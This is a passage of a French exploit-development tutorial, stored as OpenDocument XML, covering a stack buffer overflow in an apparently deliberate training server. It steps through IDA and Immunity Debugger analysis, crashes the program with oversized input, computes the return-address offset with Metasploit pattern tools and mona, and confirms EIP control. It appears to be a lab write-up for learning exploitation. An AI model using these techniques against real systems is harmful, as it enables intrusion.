      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images9" text:anchor-type="paragraph" svg:width="12.913cm" svg:height="12.938cm" draw:z-index="8"><draw:image xlink:href="Pictures/20000007000032710000328BEAD101B5.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Dans le prologue de fonction, on voit une petite danse de EBP et ESP qui font de la place pour la variable locale (response, de taille 94h).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ensuite, on voit la paramétrisation de sprintf. De manière très générale, on voit qu'on push à la fonction sprintf :</text:p>
      <text:list xml:id="list570004298370928018" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P18">Le clientName</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P18">La chaîne de charactères Hello ... !!!\n</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P18">Le buffer response</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Qui sont tous les éléments dont va avoir besoin cette fonction.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On se dirige ensuite vers le bas de la fonction. On voit le dernier bloc, où se trouve l'épilogue de la fonction :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images10" text:anchor-type="paragraph" svg:width="7.04cm" svg:height="3.36cm" draw:z-index="9"><draw:image xlink:href="Pictures/2000000700001B7F00000D218B16DF66.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">L'épilogue de la fonction dépile la fonction de la stack, puis RETURN le flux d'exécution à la fonction qui a CALL.</text:p>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T15">Notons l'adresse du prologue de fonction (on la récupère directement car cela forme un "bloc" à part entière pour IDA) : </text:span><text:span text:style-name="T4">0x8041794</text:span><text:span text:style-name="T15">.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P2"><text:span text:style-name="T15">Il nous manque encore un élément pour pouvoir continuer, c'est l'adresse à laquelle se trouve le CALL de </text:span><text:span text:style-name="T4">doResponse()</text:span><text:span text:style-name="T15"> (dans </text:span><text:span text:style-name="T4">handleConnection()</text:span><text:span text:style-name="T15"> donc). On pourrait essayer de cliquer sur handleConnection() dans la "Functions Window" et chercher de manière manuelle où se trouve ce CALL, mais pour aller plus rapidement, on va utiliser une feature d'IDA : </text:span><text:span text:style-name="T4">xrefs</text:span><text:span text:style-name="T15"> (Cross References). Cela va simplement chercher où la fonction est mentionnée dans le programme. Pour utiliser cette feature, on clique sur n'importe quelle mention de </text:span><text:span text:style-name="T4">_doResponse</text:span><text:span text:style-name="T15"> dans le disassembly, et on appuie sur la touche '</text:span><text:span text:style-name="T4">x</text:span><text:span text:style-name="T15">' :</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images11" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="7.086cm" draw:z-index="10"><draw:image xlink:href="Pictures/2000000700005844000024CC79B47CB6.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T15">Comme prévu, le seul endroit où la fonction est référencée est dans un CALL, situé dans </text:span><text:span text:style-name="T4">_handleConnection</text:span><text:span text:style-name="T15">. On clique sur "OK" pour se rendre à l'endroit de cette référence :</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images12" text:anchor-type="paragraph" svg:width="7.17cm" svg:height="5.399cm" draw:z-index="11"><draw:image xlink:href="Pictures/2000000700001C0300001517D350CC35.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Le problème c'est que dans la vue par graphique, il n'est pas affiché l'adresse précise de telle instruction (seulement les adresses des blocs). Il faut cliquer sur l'instruction (c'est maintenant surligné, comme dans le screenshot), et taper sur "Space Bar" : cela va nous mener à la "linear disassembly" (pas par graphique donc), qui affiche toutes les adresses de toutes les instructions :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images13" text:anchor-type="paragraph" svg:width="16.986cm" svg:height="3.598cm" draw:z-index="12"><draw:image xlink:href="Pictures/200000070000425B00000E0FB7602CF2.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">L'adresse du CALL est donc <text:span text:style-name="T5">0x804168D</text:span>.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">EXAMINER LA MÉCANIQUE CALL SUR IMMUNITY :</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P7"><text:span text:style-name="T16">Maintenant qu'on est armé de l'adresse de l'épilogue de la fonction </text:span><text:span text:style-name="T6">doResponse()</text:span><text:span text:style-name="T16"> et de l'adresse de son CALL, examinons la mécanique CALL / RETURN de la fonction dans Immunity, en utilisant des breakpoints.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Les breakpoints, comme on le sait, indiquent au débugger qu'on veut arrêter l'exécution du programme à un point précis (pour examiner l'état du programme avec le débugger, dire au programme de s'arrêter, ou même modifier le contenu des registers / le code du programme).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P7"><text:span text:style-name="T16">Pour isoler le fonctionnement de notre fonction vulnérable </text:span><text:span text:style-name="T6">doResponse()</text:span><text:span text:style-name="T16">, on va établir un breakpoint aux deux adresses suivantes :</text:span></text:p>
      <text:list xml:id="list2119935182184935742" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P16"><text:span text:style-name="T6">0x804168D</text:span><text:span text:style-name="T16">, soit l'appel à </text:span><text:span text:style-name="T6">doResponse()</text:span><text:span text:style-name="T16"> au sein de </text:span><text:span text:style-name="T6">handleConnection()</text:span><text:span text:style-name="T16">.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P19"><text:span text:style-name="T5">0x8041794</text:span>, soit l'épilogue de la fonction <text:span text:style-name="T5">doResponse()</text:span>.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour set un breakpoint, on peut naviguer jusqu'à l'adresse souhaitée (Clic Droit, "Go to -&gt; Expression -&gt; 0x804168D), puis Clic Droit, "Toggle Breakpoint". On peut également, si on connaît l'adresse précise du breakpoint qu'on souhaite ajouter, entrer dans la barre de commande :</text:p>
      <text:p text:style-name="P4">b 0x804168D</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Quoi qu'il en soit, on a désormais nos deux breakpoints (pour le vérifier, View --&gt; Breakpoints) :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr3" draw:name="images14" text:anchor-type="paragraph" svg:width="13.07cm" svg:height="4.577cm" draw:z-index="13"><draw:image xlink:href="Pictures/200000070000330F000011E29EF1DA38.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Premier breakpoint :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images15" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.351cm" draw:z-index="14"><draw:image xlink:href="Pictures/200000070000781A0000027CD463B527.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On a bien un appel CALL, et quand on va à l'adresse <text:span text:style-name="T5">0x80416F0</text:span> on entre bien dans une fonction qu'on identifie facilement comme étant <text:span text:style-name="T5">doResponse()</text:span>. Le second breakpoint :</text:p>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images16" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.764cm" draw:z-index="15"><draw:image xlink:href="Pictures/200000070000754F0000054651C5B801.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/>On voit bien qu'il s'agit de l'épilogue d'une fonction, au vu de l'appel RETN qui apparaît quelques instructions plus loin.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bref, avec nos breakpoints, on fait tourner le programme. Celui-ci ne s'arrête pas, pour le moment, aux breakpoints, puisqu'il n'y a pas encore eu d'appel à <text:span text:style-name="T5">handleConnction()</text:span> et <text:span text:style-name="T5">doResponse()</text:span> (on attend juste des connections pour le moment). Le programme est donc "Running" (en bas à droite). Pour trigger nos breakpoints et pouvoir analyser le fonctionnement de la fonction <text:span text:style-name="T5">doResponse()</text:span>, on va simplement exécuter notre script python envoyant un message basique à notre programme.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dès qu'on l'exécute, Immunity Debugger s'agit et nous affiche l'état du programme "Paused" : on a déclenché notre premier breakpoint, juste avant l'appel à <text:span text:style-name="T5">doResponse()</text:span> donc.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Lors d'un appel à CALL, il se passe deux choses :</text:p>
      <text:list xml:id="list1132402088235736885" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P20">L'adresse de l'instruction suivant le CALL à l'autre fonction est empilée sur la pile, pour y revenir une fois que la fonction appelée aura terminé son travail.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P20">Le registre EIP est modifié pour que l'exécution saute à la première instruction de la fonction appelée.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Avant de "Step Into" la prochaine instruction, et donc d'exécuter le CALL, examinons l'état de la pile :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images17" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.094cm" draw:z-index="16"><draw:image xlink:href="Pictures/200000070000559500000A8CFE9FDF5D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T5">0x08119E4</text:span> est le haut de la pile comme nous l'indique le pointer ESP. <text:s/>On a pour le moment sur la stack les 2 arguments de la fonction <text:span text:style-name="T5">doResponse()</text:span> : le clientSocket, et la chaîne de charactères "Python Script". On voit en effet que les arguments de la fonction qui va être appelée sont empilés (PUSH) avant le CALL :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images18" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.15cm" draw:z-index="17"><draw:image xlink:href="Pictures/2000000700007285000007C12801EC2B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Maintenant, faisons un "Step Into" (F7) afin d'exécuter le CALL. On voit d'abord que EIP a sauté à l'adresse <text:span text:style-name="T5">0x80416F0</text:span>, désignant le début de la fonction doResponse() qui a été CALL ; on a bien redirigé le flux d'exécution. Ensuite, on voit que le haut de la pile est passé de <text:span text:style-name="T5">0x08119E4</text:span> à <text:span text:style-name="T5">0x08119E0</text:span> : la pile a bien grandit (vers les adresses basses), de 4 bytes, et on y a ajouté l'adresse <text:span text:style-name="T5">0x8041692</text:span>, qui est bien sûr l'adresse de l'instruction suivante de la fonction qui a appelé <text:span text:style-name="T5">doResponse()</text:span> (l'adresse de retour) :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images19" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.062cm" draw:z-index="18"><draw:image xlink:href="Pictures/200000070000649100000C33498A6979.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Notre flux d'exécution se trouve donc désormais juste avant le prologue de la fonction <text:span text:style-name="T5">doResponse()</text:span>. Un prologue de fonction se compose toujours de 3 instructions :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>&gt; "<text:span text:style-name="T2">PUSH EBP</text:span>" to save the current EBP value on the stack (pour toutes les questions de registre EBP, voir fichier EBP_explained).</text:p>
      <text:p text:style-name="P9">&gt; "<text:span text:style-name="T2">MOV EBP, ESP</text:span>" to copy the current value of ESP to EBP, setting up a new EBP base pointer value;</text:p>
      <text:p text:style-name="P9">&gt; "<text:span text:style-name="T2">SUB ESP, &lt;something&gt;</text:span>" to make room on the stack for function local variables.</text:p>
      <text:p text:style-name="P9">(Certains compilateurs utiliseront l'instruction ENTER, au lieu de ces trois instruction).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Une fois qu'on a "Step Into" ces trois instructions, on voit que la stack s'est agrandie (de 0x94 plus précisément, la limite haute de la pile est passée de <text:span text:style-name="T5">0x08119E0</text:span> à <text:span text:style-name="T5">0x0811948</text:span>), pour faire de la place pour les variables locales. On peut voir dans cet espace des données, qui sont en réalité les restes de variables locales d'autres fonctions du programme qui ne sont plus utilisées ; on peut donc les ignorer.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">EXAMINER LA MÉCANIQUE RETURN SUR IMMUNITY :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Maintenant qu'on a compris comment une fonction CALL une autre fonction, voyons la mécanique entourant le processus de RETURN à la fonction initiale.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On a vu que l'appel à CALL mettait sur la pile l'adresse de l'instruction suivante pour la fonction appelante. A la fin de la fonction appelée, c'est le travail de l'épilogue de la fonction que de restaurer la pile à son état initial, restaurer la valeur sauvegardée d'EBP, et RETURN à l'adresse désignée par le Saved Return Pointer.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour faire ce travail, les épilogues de fonctions se composent en général de ces trois instructions :</text:p>
      <text:p text:style-name="P9">&gt; "<text:span text:style-name="T5">MOV ESP, EBP</text:span>" to pivot the stack back down to the saved EBP and Saved Return Pointer area.</text:p>
      <text:p text:style-name="P9">&gt; "<text:span text:style-name="T5">POP EBP</text:span>" to restore the saved EBP value into the EBP register (Voir EBP_explained).</text:p>
      <text:p text:style-name="P9">&gt; "<text:span text:style-name="T5">RET</text:span>" to return to the Saved Return Pointer.</text:p>
      <text:p text:style-name="P9">(Certains compilateurs utiliseront l'instruction LEAVE, au lieu de ces trois instructions).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Exécutons notre programme jusqu'au second breakpoint, juste avant l'épilogue de fonction (on appuie sur "Run" ou "F9" pour faire tourner le programme jusqu'au breakpoint suivant). A ce point de la fonction, on aura construit notre buffer response, puis on aura déjà envoyé les données (d'ailleurs on voit que notre script python a bien complété, et a reçu la réponse "<text:span text:style-name="T5">Hello Python Script !!!\n</text:span>") :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images20" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.487cm" draw:z-index="19"><draw:image xlink:href="Pictures/200000070000659A000008E4A28B2B2C.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Et la stack ressemble à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images21" text:anchor-type="paragraph" svg:width="19.131cm" svg:height="7.689cm" draw:z-index="20"><draw:image xlink:href="Pictures/20000007000061280000279786906A9A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">Comme on le voit, notre fonction a correctement construit, par le biais de <text:span text:style-name="T5">sprintf</text:span>, le buffer response, qui contient "<text:span text:style-name="T5">Hello Python Script !!!\n</text:span>".</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Maintenant, si on "Step Into" la prochaine instruction, on va copier la valeur de EBP dans ESP, afin de "dépiler" de la stack toutes les variables locales à la fonction dont on a plus besoin, et de se positionner juste avant le Saved Return Pointer :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images22" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.596cm" draw:z-index="21"><draw:image xlink:href="Pictures/2000000700005CB600000E2A0ACA50AE.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Quand on "Step Into" l'instruction <text:span text:style-name="T5">POP EBP</text:span>, il se passe deux choses :</text:p>
      <text:list xml:id="list2782571748771059911" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P21">EBP adopte la valeur sauvegardée à l'adresse du "Saved EBP".</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P21">ESP descend d'une adresse, pour arriver pile sur l'adresse de retour.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Maintenant, EIP pointe sur l'instruction RETN de la fonction <text:span text:style-name="T5">doResponse()</text:span>. L'instruction RETN fait que le flux d'exécution est redirigé à l'adresse stockée sur la pile et pointée par ESP, ce qui devrait, si tout se passe bien, être l'adresse de retour qui a été mise là par l'instruction CALL. C'est bien le cas ici, l'exécution saute à l'adresse suivante de la fonction appelante :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images23" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.752cm" draw:z-index="22"><draw:image xlink:href="Pictures/200000070000534E0000089570FCAB43.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Et sur la stack, le Saved Return Pointer est dépilé puisque ESP pointe désormais 4 adresses plus haut, sur les arguments de la fonction :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images24" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.034cm" draw:z-index="23"><draw:image xlink:href="Pictures/20000007000066D700000C4ED4CACE53.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/>Et les arguments de la fonction seront justement dépilés <text:span text:style-name="T9">par la fonction appelante</text:span> (comme ils ont été empilés par elle), au travers de l'instruction suivant tout juste l'appel à CALL, et à laquelle on vient de retourner, puisque cette instruction est : </text:p>
      <text:p text:style-name="P4">ADD ESP, 8</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">TRIGGER THE BUG :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Il est maintenant l'heure de trigger notre stack buffer overflow (trigger the bug often results in a DoS exploit). On sait que la variable vulnérable est le buffer <text:span text:style-name="T5">response[128]</text:span>. Si on fournit à la fonction <text:span text:style-name="T5">doResponse() </text:span>un client name très long, la chaîne de caractère va dépasser du buffer <text:span text:style-name="T5">response[128]</text:span>, et donc écraser tout ce qu'il se trouve ensuite sur la pile, y compris, au bout d'un moment, le Saved Return Pointer.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Voyons ce comportement en modifiant légèrement notre script Python. Au lieu d'envoyer "Python Script" à notre programme, on lui envoie 1024 "A", suivis d'un retour à la ligne :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images25" text:anchor-type="paragraph" svg:width="11.114cm" svg:height="10.292cm" draw:z-index="24"><draw:image xlink:href="Pictures/2000000700002B6A00002835C8E62E2A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Gardons nos breakpoints pour bien voir ce qu'il se passe. Après l'épilogue de la fonction <text:span text:style-name="T5">doResponse()</text:span>, on a notre pile normale, avec :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">De l'espace pour toutes les variables locales.</text:p>
      <text:p text:style-name="P9">Le Saved Base Pointer.</text:p>
      <text:p text:style-name="P9">Le Saved Return Pointer. </text:p>
      <text:p text:style-name="P9">Les arguments passés à la fonction.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr5" draw:name="images26" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="5.659cm" draw:z-index="25"><draw:image xlink:href="Pictures/20000007000068CE0000250185814667.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">On continue de faire tourner le programme. Juste avant l'appel à l'épilogue de la fonction, on ne voit plus que des "A" partout, y compris là où auparavant il y avait le Saved Base Pointer et le Saved Return Pointer :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images27" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="6.817cm" draw:z-index="26"><draw:image xlink:href="Pictures/2000000700005D0600002550FC52A321.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Donc forcément, quand on "Step Into" l'instruction "RETN", on se retrouve avec le message d'erreur suivant :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images28" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.386cm" draw:z-index="27"><draw:image xlink:href="Pictures/2000000700005668000001F8B73BED80.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On a essayé de retourner à l'adresse 41414141 puisque nos "A" ont écrasé l'adresse de retour. Ce qui n'est pas possible, d'où l'erreur : on a trigger le bug.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">CALCULATE THE OFFSET :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">C'est bien joli tout ça, mais on veut savoir maintenant précisément quels "A" ont overwrite l'adresse de retour, pour pouvoir contrôler cette adresse de retour. Le plus simple est d'utiliser le script "pattern_create.rb" qui est mis à disposition par metasploit :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P4">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On utilise la commande suivante :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P4">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>Cela va générer une séquence de caractères où chaque morceau de 4 caractères est unique. Utilisons cette séquence dans notre script (au lieu des 24 "A"), et voyons quel morceau de 4 caractères écrase le Saved Return Pointer.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images29" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="8.691cm" draw:z-index="28"><draw:image xlink:href="Pictures/20000007000060D800003183FFA1EDF1.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">On fait tourner notre programme dans Immunity, on exécute <text:span text:style-name="T5">exploit.py</text:span>, on passe nos deux breakpoints, et cette fois on se retrouve avec l'erreur suivante :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images30" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.266cm" draw:z-index="29"><draw:image xlink:href="Pictures/20000007000055FE000001592323F7A8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">La séquence suivante a overwrite le Saved Return Pointer (écrit en hexadecimal dans la stack, on le traduit en ASCII) :</text:p>
      <text:p text:style-name="P9">39 --&gt; 9</text:p>
      <text:p text:style-name="P9">65 --&gt; e</text:p>
      <text:p text:style-name="P9">41 --&gt; A</text:p>
      <text:p text:style-name="P9">38 --&gt; 8</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On doit donc chercher où apparaît la séquence "9eA8" dans notre pattern. Pour cela, on a deux solutions.</text:p>
      <text:p text:style-name="P9"/>
      <text:list xml:id="list7830177310369437766" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P22">La solution simple</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">La solution simple est de simplement entrer la commande :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P4">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Attention ce n'est pas le même script (il s'agit ici de pattern_offset.rb et pas pattern_create.rb). On voit que l'offset est de 146 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images31" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="0.676cm" draw:z-index="30"><draw:image xlink:href="Pictures/2000000700004E090000031B1DD08E8C.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Ce qui veut dire que les 4 lettres sont en position 147, 148, 149 et 150.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:list xml:id="list2823872145627701298" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P23"><text:soft-page-break/>La solution un peu plus complexe</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Utiliser mona.py. La commande "findmsp" de mona va chercher dans le processus toutes les occurences de "cyclic patterns" et nous donner des informations sur chacune des occurences (typiquement si un des registres contient un subset du pattern).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr4" draw:name="images32" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="9.885cm" draw:z-index="31"><draw:image xlink:href="Pictures/200000070000674100003C0D14297475.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Ici, on voit qu'EIP contient le pattern à partir de l'offset 146 (on confirme le résultat précédent).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On voit également qu'ESP contient le pattern à partir de l'offset 150. Ce qui fait tout à fait sens : rappelons nous que juste avant le CALL RETN, ESP est situé pile sur l'adresse de retour. Mais quand RETN est appelé, il se passe deux choses :</text:p>
      <text:list xml:id="list2209616523113696381" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P24">EIP saute à l'adresse stockée à l'adresse de ESP.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P24">ESP est incrémenté de 4, pour dépiler l'adresse de retour.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ici ESP a été incrémenté de 4 par rapport au Saved Return Pointer, donc il est à l'offset 150.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">De même, il est logique qu'EBP contienne l'offset 142. Le Saved Pointer Base se situe juste au-dessus du Saved Return Pointer dans la stack. A l'épilogue de la fonction, EBP adopte la valeur sauvegardée dans le Saved Base Pointer ... Qui a ici été écrasée par notre exploit et donc par le "cyclic pattern".</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">CONFIRM OFFSET, CONTROL EIP :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Modifions un peu notre script d'exploit :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images33" text:anchor-type="paragraph" svg:width="10.162cm" svg:height="12.517cm" draw:z-index="32"><draw:image xlink:href="Pictures/20000007000027B1000030E43C043D15.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">L'idée ici est qu'EIP soit redirigé vers "BBBB", et qu'ESP pointe sur "CCCC", comme ça on aura bien confirmé notre maîtrise du Saved Return Pointer.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dans cette ligne :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P4">buf += "A"*(offset – len(buf))</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On affiche 146 "A" au début du buffer, pour combler l'offset (on soustrait la taille actuelle du buffer, mais ici ça sera 0. On ne fait ça que si le buffer n'était pas vide, et qu'on voulait avoir des caractères au début : il faudra alors mettre <text:span text:style-name="T5">146 – nb_caractères_déjà_présents</text:span> dans le buffer, ce qu'on fait ici).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ensuite, on met "BBBB" et "CCCC" qui correspondront au Saved Return Pointer, et à l'adresse d'ESP.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Enfin, on remarque cette ligne :</text:p>
